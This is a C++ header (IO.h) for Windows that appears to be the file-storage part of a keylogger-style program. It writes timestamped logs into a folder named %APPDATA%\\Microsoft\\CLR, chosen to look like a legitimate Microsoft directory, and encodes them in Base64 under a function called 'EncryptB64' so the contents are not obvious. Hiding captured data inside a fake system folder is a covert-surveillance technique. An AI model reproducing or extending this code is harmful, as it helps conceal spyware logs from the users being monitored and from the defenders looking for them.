/*
 * IO.h
 *
 *  Created on: 04-Jul-2017
 *      Author: nisar
 */

#ifndef IO_H_
#define IO_H_

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO {

	std::string GetOurPath(const bool append_seperator = false){
    	std::string appdata_dir(getenv("APPDATA")); //gets environmental variable containing APPDATA directory
    	std::string full = appdata_dir + "\\Microsoft\\CLR";
    	return full + (append_seperator ? "\\" : "");
	}

	//creates directory, returns true if successful
	bool MkOneDr(std::string path){
    	return (bool)CreateDirectory(path.c_str(), NULL) ||
    	GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MkDir(std::string path){
    	for(char &c : path){
        	if (c == '\\'){
            	c = '\0';
            	if(!MkOneDr(path))
                	return false;
            	c = '\\';
        	}
    	}
    	return true;
	}

	template <class T>
	std::string WriteLog (const T &t){
    	std::string path = GetOurPath(true);
    	Helper::DateTime dt;
    	std::string name = dt.GetDateTimeString("_") + ".log";
    	try {
        	std::ofstream file(path + name);
        	if (!file) return "";
        	std::ostringstream s;

        	s << "[" << dt.GetDateTimeString() << "]" <<
        	std::endl << t << std::endl;
        	std::string data = Base64::EncryptB64(s.str());

        	file << data;

        	if(!file) return "";

        	file.close();

        	return name;
    	}
    	catch(...){
        	return "";
    	}
	}

} //closing bracket of namespace IO




#endif /* IO_H_ */
